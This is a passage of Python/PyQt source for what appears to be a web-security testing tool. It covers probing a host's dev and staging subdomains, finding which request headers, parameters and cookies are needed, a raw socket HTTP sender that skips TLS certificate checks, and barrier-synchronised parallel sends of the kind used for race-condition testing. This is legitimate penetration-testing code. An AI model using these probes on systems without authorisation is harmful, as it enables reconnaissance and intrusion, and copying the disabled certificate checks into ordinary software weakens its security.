            flag.setForeground(QColor("#f9e2af"))
            bg = QColor("#2e2a1e")
            for c in range(5):
                it = self.table.item(r, c)
                if it:
                    it.setBackground(bg)
        self.table.setItem(r, 4, flag)


# ─────────────────────────────────────────────────────────────────────────────
# Environment Checker — thread + dialog
# ─────────────────────────────────────────────────────────────────────────────

class _EnvCheckThread(QThread):
    result_ready = pyqtSignal(str, str, int, float)  # url, status, size, ms
    finished_all = pyqtSignal()

    def __init__(self, host, port, use_ssl, raw, timeout=8, parent=None):
        super().__init__(parent)
        self.host, self.port, self.use_ssl = host, port, use_ssl
        self.raw, self.timeout = raw, timeout

    def _rebuild(self, new_host, new_path=None):
        lines = self.raw.splitlines(keepends=True)
        out = []
        for i, line in enumerate(lines):
            if i == 0 and new_path:
                parts = line.rstrip("\r\n").split(" ", 2)
                if len(parts) >= 2:
                    parts[1] = new_path
                    line = " ".join(parts) + "\r\n"
            if re.match(r'[Hh]ost:', line):
                line = f"Host: {new_host}\r\n"
            out.append(line)
        return "".join(out)

    def run(self):
        parts = self.host.split(".")
        base = ".".join(parts[-2:]) if len(parts) > 2 else self.host
        first = self.raw.splitlines()[0] if self.raw else ""
        path = first.split()[1] if len(first.split()) >= 2 else "/"
        scheme = "https" if self.use_ssl else "http"
        seen = set()

        def _probe(new_host, new_path=None):
            key = (new_host, new_path or path)
            if key in seen or new_host == self.host:
                return
            seen.add(key)
            req = self._rebuild(new_host, new_path)
            disp = new_path or path
            url = f"{scheme}://{new_host}:{self.port}{disp}"
            try:
                resp, ms, sz = _raw_http_send(new_host, self.port, self.use_ssl, req, self.timeout)
                m = re.match(r'HTTP/\S+\s+(\d+)', resp)
                st = m.group(1) if m else "?"
                self.result_ready.emit(url, st, sz, ms)
            except Exception:
                pass

        for prefix in _ENV_SUBDOMAIN_PREFIXES:
            _probe(f"{prefix}.{base}")
        for pp in _ENV_PATH_PREFIXES:
            _probe(self.host, pp.rstrip("/") + "/" + path.lstrip("/"))

        self.finished_all.emit()


class _EnvCheckDialog(QDialog):
    def __init__(self, host, port, use_ssl, raw, timeout=8, parent=None):
        super().__init__(parent, Qt.Window)
        self.setAttribute(Qt.WA_DeleteOnClose)
        scheme = "https" if use_ssl else "http"
        self.setWindowTitle("🌐 Environment Finder")
        self.resize(940, 520)
        self.setStyleSheet(_DIALOG_STYLE)
        layout = QVBoxLayout(self)
        layout.setSpacing(6)

        info = QLabel(
            f"Probing dev / staging / test variants of  <b>{scheme}://{host}:{port}</b><br>"
            "<small>Subdomains that don't resolve or refuse are silently skipped. "
            "2xx responses are highlighted in green.</small>"
        )
        info.setWordWrap(True)
        info.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:12px;")
        layout.addWidget(info)

        self.table = QTableWidget(0, 4)
        self.table.setHorizontalHeaderLabels(["URL", "Status", "Size", "Time (ms)"])
        self.table.horizontalHeader().setSectionResizeMode(0, QHeaderView.Stretch)
        for c in (1, 2, 3):
            self.table.horizontalHeader().setSectionResizeMode(c, QHeaderView.ResizeToContents)
        self.table.setEditTriggers(QAbstractItemView.NoEditTriggers)
        self.table.setSelectionBehavior(QAbstractItemView.SelectRows)
        self.table.setAlternatingRowColors(True)
        self.table.setStyleSheet(_TABLE_STYLE2)
        layout.addWidget(self.table)

        foot = QHBoxLayout()
        self._lbl = QLabel("⏳ Probing environments…")
        self._lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:11px;")
        foot.addWidget(self._lbl)
        foot.addStretch()
        open_btn = QPushButton("🔗 Open in Browser")
        open_btn.clicked.connect(self._open_sel)
        foot.addWidget(open_btn)
        close_btn = QPushButton("Close")
        close_btn.clicked.connect(self.accept)
        foot.addWidget(close_btn)
        layout.addLayout(foot)

        self._t = _EnvCheckThread(host, port, use_ssl, raw, timeout, self)
        self._t.result_ready.connect(self._add_row)
        self._t.finished_all.connect(lambda: self._lbl.setText(
            f"✅ Done — {self.table.rowCount()} responding environment(s) found."))
        self._t.start()

    def _add_row(self, url, status, size, ms):
        r = self.table.rowCount()
        self.table.insertRow(r)
        self.table.setItem(r, 0, QTableWidgetItem(url))
        self.table.setItem(r, 1, _color_status_item(status))
        self.table.setItem(r, 2, QTableWidgetItem(f"{size:,} B"))
        self.table.setItem(r, 3, QTableWidgetItem(f"{ms:.0f}"))
        if status.startswith("2"):
            bg = QColor("#1e2e1e")
            for c in range(4):
                it = self.table.item(r, c)
                if it:
                    it.setBackground(bg)

    def _open_sel(self):
        row = self.table.currentRow()
        it = self.table.item(row, 0)
        if it:
            try:
                import subprocess
                subprocess.Popen(["xdg-open", it.text()])
            except Exception:
                QApplication.clipboard().setText(it.text())
                self._lbl.setText("URL copied to clipboard.")


# ─────────────────────────────────────────────────────────────────────────────
# Clean Request Analyser — thread + dialog
# ─────────────────────────────────────────────────────────────────────────────

class _CleanRequestThread(QThread):
    """
    Sends baseline, then removes each header / query-param / body-param one at a
    time and reports the effect on response status and body size.
    """
    baseline_done = pyqtSignal(str, int)               # status, body_size
    result_ready  = pyqtSignal(str, str, str, int, int)  # kind, label, status, size, diff
    finished_all  = pyqtSignal()

    _SKIP = {"host", "content-length", "connection", "transfer-encoding"}

    def __init__(self, host, port, use_ssl, raw, timeout=15, parent=None):
        super().__init__(parent)
        self.host, self.port, self.use_ssl = host, port, use_ssl
        self.raw, self.timeout = raw, timeout

    @staticmethod
    def _status(resp):
        m = re.match(r'HTTP/\S+\s+(\d+)', resp)
        return m.group(1) if m else ""

    @staticmethod
    def _bsize(resp):
        for sep in ("\r\n\r\n", "\n\n"):
            if sep in resp:
                return len(resp.split(sep, 1)[1])
        return 0

    def _parse(self):
        for sep in ("\r\n\r\n", "\n\n"):
            if sep in self.raw:
                head, body = self.raw.split(sep, 1)
                break
        else:
            head, body = self.raw, ""
        lines = head.strip().splitlines()
        return (lines[0] if lines else ""), (lines[1:] if len(lines) > 1 else []), body

    def _rebuild(self, first, hdrs, qs=None, bp=None, body=None):
        if qs is not None and "?" in first:
            path, _ = first.split()[1].split("?", 1) if len(first.split()) >= 2 else ("/", "")
            new_qs = urllib.parse.urlencode(qs)
            new_path = path + ("?" + new_qs if new_qs else "")
            pts = first.split()
            if len(pts) >= 2:
                pts[1] = new_path
            first = " ".join(pts)
        body_out = body or ""
        if bp is not None:
            body_out = urllib.parse.urlencode(bp)
        return "\r\n".join([first] + hdrs) + "\r\n\r\n" + body_out

    def run(self):
        try:
            base_resp, _, _ = _raw_http_send(self.host, self.port, self.use_ssl, self.raw, self.timeout)
            b_st = self._status(base_resp)
            b_sz = self._bsize(base_resp)
        except Exception as e:
            self.baseline_done.emit(f"ERR: {e}", 0)
            self.finished_all.emit()
            return
        self.baseline_done.emit(b_st, b_sz)

        first, other_hdrs, body = self._parse()
        path = first.split()[1] if len(first.split()) >= 2 else "/"
        qs_params = urllib.parse.parse_qsl(path.split("?", 1)[1], keep_blank_values=True) if "?" in path else []

        ct = next((h.split(":", 1)[1].strip().lower()
                   for h in other_hdrs if h.lower().startswith("content-type:")), "")
        body_params = (urllib.parse.parse_qsl(body.strip(), keep_blank_values=True)
                       if "application/x-www-form-urlencoded" in ct and body.strip() else [])

        def _probe(kind, label, req):
            try:
                resp, _, _ = _raw_http_send(self.host, self.port, self.use_ssl, req, self.timeout)
                st = self._status(resp)
                sz = self._bsize(resp)
            except Exception:
                st, sz = "ERR", 0
            self.result_ready.emit(kind, label, st, sz, abs(sz - b_sz))

        for i, hdr in enumerate(other_hdrs):
            if hdr.split(":", 1)[0].strip().lower() in self._SKIP:
                continue
            trimmed = [h for j, h in enumerate(other_hdrs) if j != i]
            _probe("header", hdr.split(":", 1)[0].strip(),
                   self._rebuild(first, trimmed, None, None, body))

        for i, (k, v) in enumerate(qs_params):
            trimmed = [(pk, pv) for j, (pk, pv) in enumerate(qs_params) if j != i]
            _probe("param", f"{k}={v[:40]}", self._rebuild(first, other_hdrs, trimmed, None, body))

        for i, (k, v) in enumerate(body_params):
            trimmed = [(pk, pv) for j, (pk, pv) in enumerate(body_params) if j != i]
            _probe("body_param", f"{k}={v[:40]}", self._rebuild(first, other_hdrs, None, trimmed))

        # Test individual cookies inside the Cookie header
        ck_hdr_idx = next(
            (i for i, h in enumerate(other_hdrs) if h.lower().startswith("cookie:")), -1
        )
        if ck_hdr_idx >= 0:
            ck_raw = other_hdrs[ck_hdr_idx].split(":", 1)[1].strip()
            cookies = [c.strip() for c in ck_raw.split(";") if c.strip()]
            for i, ck in enumerate(cookies):
                remaining = [c for j, c in enumerate(cookies) if j != i]
                if remaining:
                    new_ck_hdr = "Cookie: " + "; ".join(remaining)
                    mod_hdrs = [new_ck_hdr if idx == ck_hdr_idx else h
                                for idx, h in enumerate(other_hdrs)]
                else:
                    # Last cookie — remove Cookie header entirely
                    mod_hdrs = [h for idx, h in enumerate(other_hdrs) if idx != ck_hdr_idx]
                _probe("cookie", ck[:60], self._rebuild(first, mod_hdrs, None, None, body))

        self.finished_all.emit()


def _build_cleaned_request(raw: str, rm_h: set, rm_p: set, rm_b: set, rm_ck: set) -> str:
    """Return a copy of *raw* with the specified headers/params/cookies removed."""
    for sep in ("\r\n\r\n", "\n\n"):
        if sep in raw:
            head, body = raw.split(sep, 1)
            break
    else:
        head, body = raw, ""

    lines = head.strip().splitlines()
    first = lines[0] if lines else ""
    new_hdrs = [h for h in (lines[1:] if len(lines) > 1 else [])
                if h.split(":", 1)[0].strip().lower() not in rm_h]

    if rm_ck:
        rebuilt = []
        for h in new_hdrs:
            if h.lower().startswith("cookie:"):
                ck_val = h.split(":", 1)[1].strip()
                remaining = [
                    c.strip() for c in ck_val.split(";")
                    if c.strip() and c.strip().split("=")[0].strip() not in rm_ck
                ]
                if remaining:
                    rebuilt.append("Cookie: " + "; ".join(remaining))
                # else: Cookie header omitted entirely
            else:
                rebuilt.append(h)
        new_hdrs = rebuilt

    if rm_p and "?" in first:
        parts = first.split()
        if len(parts) >= 2 and "?" in parts[1]:
            pb, qs = parts[1].split("?", 1)
            kept = [(k, v) for k, v in urllib.parse.parse_qsl(qs, keep_blank_values=True)
                    if k not in rm_p]
            parts[1] = pb + ("?" + urllib.parse.urlencode(kept) if kept else "")
            first = " ".join(parts)

    if rm_b and body.strip():
        bp = [(k, v) for k, v in urllib.parse.parse_qsl(body.strip(), keep_blank_values=True)
              if k not in rm_b]
        body = urllib.parse.urlencode(bp)

    return "\r\n".join([first] + new_hdrs) + "\r\n\r\n" + body


class _VerifyThread(QThread):
    """Sends a single probe request and returns (status, body_size) for comparison."""
    done = pyqtSignal(str, int)   # status_code_str, body_size

    def __init__(self, host, port, use_ssl, raw, timeout, parent=None):
        super().__init__(parent)
        self.host, self.port, self.use_ssl = host, port, use_ssl
        self.raw, self.timeout = raw, timeout

    def run(self):
        try:
            resp, _, _ = _raw_http_send(self.host, self.port, self.use_ssl, self.raw, self.timeout)
            m = re.match(r'HTTP/\S+\s+(\d+)', resp)
            st = m.group(1) if m else "ERR"
            body = ""
            for sep in ("\r\n\r\n", "\n\n"):
                if sep in resp:
                    body = resp.split(sep, 1)[1]
                    break
            self.done.emit(st, len(body))
        except Exception:
            self.done.emit("ERR", 0)


class _CompanionSearchThread(QThread):
    """
    After a combined-removal probe changes the response, probes each removed
    item individually — adding it back while keeping everything else removed —
    to find which items are 'companions' (at least one must stay).
    """
    item_result = pyqtSignal(str, str, bool)   # kind, label, restores_baseline
    all_done    = pyqtSignal(list)             # [(kind, label), …] companions

    def __init__(self, host, port, use_ssl, original_raw, removed_items,
                 rm_h, rm_p, rm_b, rm_ck, b_st, b_sz, timeout, parent=None):
        super().__init__(parent)
        self.host, self.port, self.use_ssl = host, port, use_ssl
        self.original_raw  = original_raw
        self.removed_items = removed_items
        self.rm_h, self.rm_p = set(rm_h), set(rm_p)
        self.rm_b, self.rm_ck = set(rm_b), set(rm_ck)
        self.b_st, self.b_sz, self.timeout = b_st, b_sz, timeout

    def _probe(self, raw):
        try:
            resp, _, _ = _raw_http_send(
                self.host, self.port, self.use_ssl, raw, self.timeout)
            m = re.match(r'HTTP/\S+\s+(\d+)', resp)
            st = m.group(1) if m else "ERR"
            body = ""
            for sep in ("\r\n\r\n", "\n\n"):
                if sep in resp:
                    body = resp.split(sep, 1)[1]
                    break
            return st, len(body)
        except Exception:
            return "ERR", 0

    def run(self):
        companions = []
        for kind, label in self.removed_items:
            # Re-build removal sets with THIS item excluded (kept in the request)
            rm_h  = set(self.rm_h)
            rm_p  = set(self.rm_p)
            rm_b  = set(self.rm_b)
            rm_ck = set(self.rm_ck)
            if kind == "header":
                rm_h.discard(label.lower())
            elif kind == "param":
                rm_p.discard(label.split("=")[0])
            elif kind == "body_param":
                rm_b.discard(label.split("=")[0])
            elif kind == "cookie":
                rm_ck.discard(label.split("=")[0].strip())

            probe = _build_cleaned_request(
                self.original_raw, rm_h, rm_p, rm_b, rm_ck)
            st, sz = self._probe(probe)
            restores = st == self.b_st and abs(sz - self.b_sz) <= 50
            self.item_result.emit(kind, label, restores)
            if restores:
                companions.append((kind, label))

        self.all_done.emit(companions)


class _CleanRequestDialog(QDialog):
    """
    Shows which headers / params are unnecessary.
    The user checks items to remove, then clicks "Apply Cleaned Request".
    """

    def __init__(self, host, port, use_ssl, raw, timeout, apply_cb, parent=None):
        super().__init__(parent, Qt.Window)
        self.setAttribute(Qt.WA_DeleteOnClose)
        self.setWindowTitle("🧹 Clean Request — Necessity Analyser")
        self.resize(980, 580)
        self.setStyleSheet(_DIALOG_STYLE)
        self._apply_cb = apply_cb
        self._raw = raw
        self._rows_meta = []   # (kind, label)
        self._b_st = ""
        self._b_sz = 0
        self._host, self._port, self._use_ssl, self._timeout = host, port, use_ssl, timeout
        self._pending_raw = ""
        self._vt = None
        self._ct = None
        self._rm_h = set(); self._rm_p = set()
        self._rm_b = set(); self._rm_ck = set()
        self._removed_items = []

        layout = QVBoxLayout(self)
        layout.setSpacing(6)

        info = QLabel(
            "<b>Phase 1</b>: Each row shows the effect of removing <i>one item at a time</i>.<br>"
            "<b>Phase 2</b> auto-verifies removing all <b style='color:#f38ba8'>Not needed</b> "
            "items <i>together</i>, then finds "
            "<b style='color:#f9e2af'>Companion</b> dependencies automatically."
        )
        info.setWordWrap(True)
        info.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:12px;")
        layout.addWidget(info)

        top = QHBoxLayout()
        self._base_lbl = QLabel("Baseline: waiting…")
        self._base_lbl.setStyleSheet(f"color:{COLOR_TEXT};font-weight:bold;font-size:12px;")
        top.addWidget(self._base_lbl)
        top.addStretch()
        self._prog_lbl = QLabel("⏳ Analysing…")
        self._prog_lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:11px;")
        top.addWidget(self._prog_lbl)
        layout.addLayout(top)

        self.table = QTableWidget(0, 7)
        self.table.setHorizontalHeaderLabels(
            ["☐", "Kind", "Name / Param", "Status", "Body Size", "Δ vs baseline", "Verdict"]
        )
        self.table.horizontalHeader().setSectionResizeMode(2, QHeaderView.Stretch)
        for c in (0, 1, 3, 4, 5, 6):
            self.table.horizontalHeader().setSectionResizeMode(c, QHeaderView.ResizeToContents)
        self.table.setEditTriggers(QAbstractItemView.NoEditTriggers)
        self.table.setSelectionBehavior(QAbstractItemView.SelectRows)
        self.table.setAlternatingRowColors(True)
        self.table.setStyleSheet(_TABLE_STYLE2)
        layout.addWidget(self.table)

        btn_row = QHBoxLayout()
        for label, slot in [("☑ Select Not-Needed", self._sel_unneeded),
                             ("☐ Clear All",         self._clr)]:
            b = QPushButton(label)
            b.clicked.connect(slot)
            btn_row.addWidget(b)
        btn_row.addStretch()
        self._apply_btn = QPushButton("✂️  Apply Cleaned Request")
        self._apply_btn.setStyleSheet(
            f"background:{COLOR_ACCENT};color:#fff;font-weight:bold;"
            f"padding:5px 16px;border:none;border-radius:4px;"
        )
        self._apply_btn.setEnabled(False)   # enabled once Phase 2 determines the result
        self._apply_btn.clicked.connect(self._apply)
        btn_row.addWidget(self._apply_btn)
        close_btn = QPushButton("Close")
        close_btn.clicked.connect(self.accept)
        btn_row.addWidget(close_btn)
        layout.addLayout(btn_row)

        self._phase2_lbl = QLabel("⏳ Phase 2: Waiting for Phase 1 to complete…")
        self._phase2_lbl.setWordWrap(True)
        self._phase2_lbl.setStyleSheet(
            f"color:{COLOR_TEXT_MUTED};font-size:11px;"
            f"border-top:1px solid {COLOR_BORDER};padding:4px 0;"
        )
        layout.addWidget(self._phase2_lbl)

        self._t = _CleanRequestThread(host, port, use_ssl, raw, timeout, self)
        self._t.baseline_done.connect(self._on_baseline)
        self._t.result_ready.connect(self._add_row)
        self._t.finished_all.connect(self._auto_verify)   # Phase 2 starts automatically
        self._t.start()

    def _on_baseline(self, st, sz):
        self._b_st, self._b_sz = st, sz
        self._base_lbl.setText(f"Baseline: HTTP {st}  │  Body {sz:,} B")

    def _add_row(self, kind, label, status, size, diff):
        r = self.table.rowCount()
        self.table.insertRow(r)
        self._rows_meta.append((kind, label))

        chk = QCheckBox()
        cw = QWidget()
        cl = QHBoxLayout(cw)
        cl.addWidget(chk)
        cl.setAlignment(Qt.AlignCenter)
        cl.setContentsMargins(0, 0, 0, 0)
        self.table.setCellWidget(r, 0, cw)

        kind_lbl = {"header": "🔷 Header", "param": "🔹 QParam", "body_param": "🔸 Body Param", "cookie": "🍪 Cookie"}
        self.table.setItem(r, 1, QTableWidgetItem(kind_lbl.get(kind, kind)))
        self.table.setItem(r, 2, QTableWidgetItem(label))
        self.table.setItem(r, 3, _color_status_item(status))
        self.table.setItem(r, 4, QTableWidgetItem(f"{size:,} B"))
        d_item = QTableWidgetItem("0 B" if diff == 0 else f"{diff:+,} B")
        d_item.setForeground(QColor("#a6adc8" if diff == 0 else "#f38ba8"))
        self.table.setItem(r, 5, d_item)

        needed = diff > 5 or status != self._b_st
        verdict = QTableWidgetItem("✅ Needed" if needed else "❌ Not needed")
        verdict.setForeground(QColor("#a6e3a1" if needed else "#f38ba8"))
        self.table.setItem(r, 6, verdict)
        if not needed:
            bg = QColor("#221e1e")
            for c in range(1, 7):
                it = self.table.item(r, c)
                if it:
                    it.setBackground(bg)

    def _chk(self, r):
        cw = self.table.cellWidget(r, 0)
        return cw.findChild(QCheckBox) if cw else None

    def _sel_unneeded(self):
        for r in range(self.table.rowCount()):
            it = self.table.item(r, 6)
            # Only auto-select pure "Not needed" — never Companion rows
            is_unneeded = it and "Not needed" in it.text()
            chk = self._chk(r)
            if chk:
                chk.setChecked(is_unneeded)

    def _clr(self):
        for r in range(self.table.rowCount()):
            chk = self._chk(r)
            if chk:
                chk.setChecked(False)

    def _auto_verify(self):
        """Phase 2 — called automatically when Phase 1 analysis finishes."""
        self._prog_lbl.setText("✅ Phase 1 complete.")

        rm_h, rm_p, rm_b, rm_ck = set(), set(), set(), set()
        removed_items = []
        for r in range(self.table.rowCount()):
            it = self.table.item(r, 6)
            if it and "Not needed" in it.text():
                kind, label = self._rows_meta[r]
                removed_items.append((kind, label))
                if kind == "header":
                    rm_h.add(label.lower())
                elif kind == "param":
                    rm_p.add(label.split("=")[0])
                elif kind == "body_param":
                    rm_b.add(label.split("=")[0])
                elif kind == "cookie":
                    rm_ck.add(label.split("=")[0].strip())

        if not (rm_h or rm_p or rm_b or rm_ck):
            self._phase2_lbl.setText(
                "Phase 2: No 'not needed' items found — request is already minimal."
            )
            return

        self._rm_h, self._rm_p = rm_h, rm_p
        self._rm_b, self._rm_ck = rm_b, rm_ck
        self._removed_items = removed_items

        new_raw = _build_cleaned_request(self._raw, rm_h, rm_p, rm_b, rm_ck)
        self._pending_raw = new_raw
        n = len(removed_items)
        self._phase2_lbl.setText(
            f"⏳ Phase 2: Sending cleaned request ({n} item(s) removed) to verify…"
        )
        self._vt = _VerifyThread(self._host, self._port, self._use_ssl,
                                  new_raw, self._timeout, self)
        self._vt.done.connect(self._on_verify_done)
        self._vt.start()

    def _apply(self):
        """Apply the minimal cleaned request determined by Phase 2."""
        if self._pending_raw:
            self._apply_cb(self._pending_raw)
            self.accept()

    def _on_verify_done(self, st: str, sz: int):
        """Called after the Phase 2 combined-removal probe completes."""
        if st == self._b_st and abs(sz - self._b_sz) <= 50:
            # ✅ Identical to baseline — minimal request is ready
            self._apply_btn.setEnabled(True)
            self._phase2_lbl.setText(
                f"✅ Phase 2: Cleaned request matches baseline "
                f"(HTTP {st}  │  {sz:,} B). "
                "Click ‘Apply’ to use it."
            )
            return

        # ⚠️ Response changed — companion search on cookie/param values only
        diff = sz - self._b_sz
        diff_str = f"+{diff:,}" if diff > 0 else f"{diff:,}"
        self._phase2_lbl.setText(
            f"⚠️ Phase 2: Combined removal → HTTP {st}  │  {sz:,} B "
            f"(Δ {diff_str} B vs baseline HTTP {self._b_st}) — "
            "checking cookie/param companion dependencies…"
        )

        # Only test cookie/param items — plain headers cannot be companions
        companion_candidates = [
            (kind, label) for kind, label in self._removed_items
            if kind in ("cookie", "param", "body_param")
        ]

        if not companion_candidates:
            self._apply_btn.setEnabled(True)
            self._phase2_lbl.setText(
                f"⚠️ Phase 2: Response changed (HTTP {st}) — no cookie/param values "
                "among removed items to test. Review ‘Needed’ items manually."
            )
            return

        self._ct = _CompanionSearchThread(
            self._host, self._port, self._use_ssl,
            self._raw, companion_candidates,
            self._rm_h, self._rm_p, self._rm_b, self._rm_ck,
            self._b_st, self._b_sz, self._timeout, self
        )
        self._ct.item_result.connect(self._on_companion_item)
        self._ct.all_done.connect(self._on_companion_done)
        self._ct.start()

    def _on_companion_item(self, kind: str, label: str, restores: bool):
        """Update the table row verdict with companion-probe result."""
        for r in range(self.table.rowCount()):
            if self._rows_meta[r] == (kind, label):
                it = self.table.item(r, 6)
                if it:
                    if restores:
                        it.setText(" Companion (keep ≥1)")
                        it.setForeground(QColor("#f9e2af"))   # warm yellow
                        for c in range(1, 7):
                            cell = self.table.item(r, c)
                            if cell:
                                cell.setBackground(QColor("#2a2a1a"))
                    else:
                        it.setText("❌ Not needed")
                break

    def _on_companion_done(self, companions: list):
        """After companion search: update table status and set minimal request for Apply."""
        self._apply_btn.setEnabled(True)
        kind_map = {"header": "Header", "param": "QParam",
                    "body_param": "Body param", "cookie": "Cookie"}

        if not companions:
            # No single item restores baseline — multi-item interaction
            self._phase2_lbl.setText(
                "⚠️ Phase 2: No single cookie/param value restores baseline alone — "
                "interaction involves multiple items. "
                "Remove items one at a time and re-test manually. "
                "'Apply' uses the fully-cleaned (possibly broken) request."
            )
            # _pending_raw already holds the fully-cleaned request
            return

        # ── Companions found — build minimal request keeping only first companion ──
        keep_kind, keep_label = companions[0]
        rm_h  = set(self._rm_h)
        rm_p  = set(self._rm_p)
        rm_b  = set(self._rm_b)
        rm_ck = set(self._rm_ck)
        if keep_kind == "header":
            rm_h.discard(keep_label.lower())
        elif keep_kind == "param":
            rm_p.discard(keep_label.split("=")[0])
        elif keep_kind == "body_param":
            rm_b.discard(keep_label.split("=")[0])
        elif keep_kind == "cookie":
            rm_ck.discard(keep_label.split("=")[0].strip())

        self._pending_raw = _build_cleaned_request(self._raw, rm_h, rm_p, rm_b, rm_ck)

        all_names = " / ".join(
            f"{kind_map.get(k, k)}:{lbl.split('=')[0]}"
            for k, lbl in companions
        )
        keep_name = f"{kind_map.get(keep_kind, keep_kind)}:{keep_label.split('=')[0]}"
        self._phase2_lbl.setText(
            f"🔗 Phase 2: Companion found — at least one of [{all_names}] must stay. "
            f"Minimal request keeps {keep_name} and removes everything else. "
            "Click 'Apply' to use it."
        )


# Colour palette for group header tabs (cycles through these)
_GROUP_COLORS = [
    ("#1e3a5f", "#5b9bd5"),   # blue
    ("#1e4a2a", "#5bbf7a"),   # green
    ("#4a1e3a", "#bf5b9b"),   # purple
    ("#4a2e1e", "#bf8b5b"),   # orange
    ("#1e3a4a", "#5bbfbf"),   # teal
    ("#3a1e1e", "#bf5b5b"),   # red
]


class _GroupHeaderWidget(QWidget):
    """
    The dummy widget that sits inside a group-header tab.
    It is never shown as the main content area — clicking the group header
    immediately redirects focus to the first request tab in that group.
    """
    def __init__(self, group_name: str, parent=None):
        super().__init__(parent)
        self.group_name = group_name


def _raw_http_send(host: str, port: int, use_ssl: bool, raw_request: str, timeout: int) -> tuple:
    """
    Pure-function HTTP send (no Qt). Returns (resp_text, elapsed_ms, size_bytes).
    Raises on error.  Safe to call from any thread.
    """
    start = time.monotonic()

    # ── Normalise request line endings & downgrade HTTP/2 ──────────────────
    if "\r\n\r\n" in raw_request:
        header_part, body_part = raw_request.split("\r\n\r\n", 1)
    elif "\n\n" in raw_request:
        header_part, body_part = raw_request.split("\n\n", 1)
    else:
        header_part, body_part = raw_request, ""

    header_lines = header_part.strip().splitlines()
    if not header_lines:
        raise ValueError("Empty request")

    if "HTTP/2" in header_lines[0]:
        header_lines[0] = re.sub(r'HTTP/2(?:\.0)?', 'HTTP/1.1', header_lines[0])

    body_bytes = body_part.encode("utf-8", errors="replace")
    body_len   = len(body_bytes)

    has_connection = has_content_length = False
    for i in range(1, len(header_lines)):
        ll = header_lines[i].lower()
        if ll.startswith("connection:"):
            header_lines[i] = "Connection: close"
            has_connection   = True
        elif ll.startswith("content-length:"):
            key = header_lines[i].split(":", 1)[0]
            header_lines[i] = f"{key}: {body_len}"
            has_content_length = True

    if not has_connection:
        header_lines.append("Connection: close")

    method = header_lines[0].split()[0].upper() if header_lines[0].split() else ""
    if not has_content_length and (method in ("POST", "PUT", "PATCH") or body_len > 0):
        header_lines.append(f"Content-Length: {body_len}")

    raw = "\r\n".join(header_lines) + "\r\n\r\n" + body_part

    # ── Connect & send ────────────────────────────────────────────────────
    sock = socket.create_connection((host, port), timeout=timeout)
    try:
        if use_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode    = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=host)

        sock.sendall(raw.encode("utf-8", errors="replace"))

        chunks = []
        sock.settimeout(timeout)
        try:
            while True:
                chunk = sock.recv(65536)
                if not chunk:
                    break
                chunks.append(chunk)
        except socket.timeout:
            pass
    finally:
        try:
            sock.close()
        except Exception:
            pass

    elapsed_ms = (time.monotonic() - start) * 1000
    raw_resp   = b"".join(chunks)

    # ── Decode response body ───────────────────────────────────────────────
    if b"\r\n\r\n" in raw_resp:
        sep = b"\r\n\r\n"
        headers_b, body_b = raw_resp.split(sep, 1)
    elif b"\n\n" in raw_resp:
        sep = b"\n\n"
        headers_b, body_b = raw_resp.split(sep, 1)
    else:
        sep, headers_b, body_b = b"", raw_resp, b""

    try:
        h_str = headers_b.decode("utf-8", errors="ignore")

        # Step 1: decode chunked transfer encoding
        if re.search(r'transfer-encoding:\s*chunked', h_str, re.IGNORECASE) and body_b:
            try:
                decoded = b""
                buf = body_b
                while buf:
                    crlf = buf.find(b"\r\n")
                    if crlf == -1:
                        break
                    size_str = buf[:crlf].split(b";", 1)[0].strip()
                    if not size_str:
                        break
                    chunk_size = int(size_str, 16)
                    if chunk_size == 0:
                        break
                    start = crlf + 2
                    decoded += buf[start:start + chunk_size]
                    buf = buf[start + chunk_size + 2:]
                body_b = decoded
                h_str = re.sub(r'(?im)^transfer-encoding:[^\r\n]*\r?\n', '', h_str)
                headers_b = h_str.encode("utf-8", errors="replace")
            except Exception:
                pass

        # Step 2: decompress gzip / deflate
        is_gzip = (
            re.search(r'content-encoding:\s*gzip', h_str, re.IGNORECASE)
            or (body_b[:2] == b"\x1f\x8b")
        )
        if is_gzip and body_b:
            try:
                body_b = gzip.decompress(body_b)
                h_str = re.sub(r'(?im)^content-encoding:[^\r\n]*\r?\n', '', h_str)
                headers_b = h_str.encode("utf-8", errors="replace")
            except Exception:
                pass
        elif re.search(r'content-encoding:\s*deflate', h_str, re.IGNORECASE) and body_b:
            try:
                import zlib
                body_b = zlib.decompress(body_b)
                h_str = re.sub(r'(?im)^content-encoding:[^\r\n]*\r?\n', '', h_str)
                headers_b = h_str.encode("utf-8", errors="replace")
            except Exception:
                pass
        elif re.search(r'content-encoding:\s*br', h_str, re.IGNORECASE) and body_b:
            try:
                import brotli
                body_b = brotli.decompress(body_b)
                h_str = re.sub(r'(?im)^content-encoding:[^\r\n]*\r?\n', '', h_str)
                headers_b = h_str.encode("utf-8", errors="replace")
            except Exception:
                pass
    except Exception:
        pass

    resp_text = (headers_b.decode("utf-8", errors="replace")
                 + sep.decode("utf-8", errors="replace")
                 + body_b.decode("utf-8", errors="replace"))

    return resp_text, elapsed_ms, len(raw_resp)


class GroupSendThread(QThread):
    """
    Enhanced parallel send with true simultaneous transmission using a barrier.
    All threads reach the barrier and are released together, ensuring that
    sendall() calls happen at virtually the same time.
    
    Handles failures gracefully - if some connections fail, the successful ones
    still send simultaneously after a timeout.
    """
    tab_started  = pyqtSignal(int)
    tab_finished = pyqtSignal(int, str, float, int)
    tab_error    = pyqtSignal(int, str)
    all_done     = pyqtSignal()

    def __init__(self, tabs: list, mode: str = "sequential", parent=None):
        super().__init__(parent)
        self.tabs = tabs
        self.mode = mode
        self._stop_flag = False

    @staticmethod
    def _prepare_raw_bytes(raw: str) -> bytes:
        """Normalise a raw HTTP request and return wire-ready bytes."""
        if "\r\n\r\n" in raw:
            header_part, body_part = raw.split("\r\n\r\n", 1)
        elif "\n\n" in raw:
            header_part, body_part = raw.split("\n\n", 1)
        else:
            header_part, body_part = raw, ""

        lines = header_part.strip().splitlines()
        if not lines:
            raise ValueError("Empty request")

        if "HTTP/2" in lines[0]:
            lines[0] = re.sub(r'HTTP/2(?:\.0)?', 'HTTP/1.1', lines[0])

        body_bytes = body_part.encode("utf-8", errors="replace")
        body_len   = len(body_bytes)

        has_conn = has_cl = False
        for k in range(1, len(lines)):
            ll = lines[k].lower()
            if ll.startswith("connection:"):
                lines[k] = "Connection: close"
                has_conn = True
